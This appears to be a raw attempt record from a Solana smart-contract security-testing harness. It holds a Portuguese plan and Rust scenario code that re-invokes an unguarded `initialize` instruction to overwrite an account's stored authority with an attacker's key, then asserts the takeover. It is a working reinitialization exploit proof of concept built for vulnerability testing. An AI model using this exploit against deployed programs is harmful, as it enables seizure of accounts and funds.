attempts.raw:
{
  "plan": "O programa native `initialize` recebe duas contas: `user` (gravavel, 32 bytes de dados) e `authority` (signer). O baseline chama `initialize` legitimamente com a autoridade original, gravando-a na conta `user`. O ataque reutiliza a mesma instrucao sobre a conta `user` ja inicializada, mas passando a chave do atacante como `authority`, sobrescrevendo a autoridade original. O efeito medido e que os 32 bytes da conta `user` apos o ataque contem a chave do atacante, diferente da autoridade original gravada pelo baseline.",
  "scenario": "let user_key = Pubkey::new_unique();
let authority_original = Pubkey::new_unique();
let authority_atacante = Pubkey::new_unique();

let user_account = account(&env.program_id, &vec![0u8; 32], None);
let authority_original_account = wallet(1_000_000_000);
let authority_atacante_account = wallet(1_000_000_000);

let ix_baseline = env.raw_ix(&vec![0u8], &[
    AccountMeta::new(user_key, false),
    AccountMeta::new_readonly(authority_original, true),
]);

let contas_baseline = vec![
    (user_key, user_account.clone()),
    (authority_original, authority_original_account.clone()),
];

let r_baseline = env.baseline("initialize legitimo com autoridade original", &ix_baseline, &contas_baseline);

let user_pos_baseline = after(&r_baseline, &user_key).clone();

let ix_ataque = env.raw_ix(&vec![0u8], &[
    AccountMeta::new(user_key, false),
    AccountMeta::new_readonly(authority_atacante, true),
]);

let contas_ataque = vec![
    (user_key, user_pos_baseline),
    (authority_atacante, authority_atacante_account),
];

let r_ataque = env.attack("reinitialize sobrescrevendo autoridade", &ix_ataque, &contas_ataque);

if r_ataque.program_result == ProgramResult::Success {
    let dados_finais = after(&r_ataque, &user_key).data();
    let autoridade_final = read_pubkey(dados_finais, 0);
    env.effect("autoridade da conta user foi sobrescrita pela chave do atacante", autoridade_final == authority_atacante);
    env.effect("autoridade original foi substituida", autoridade_final != authority_original);
}"
}

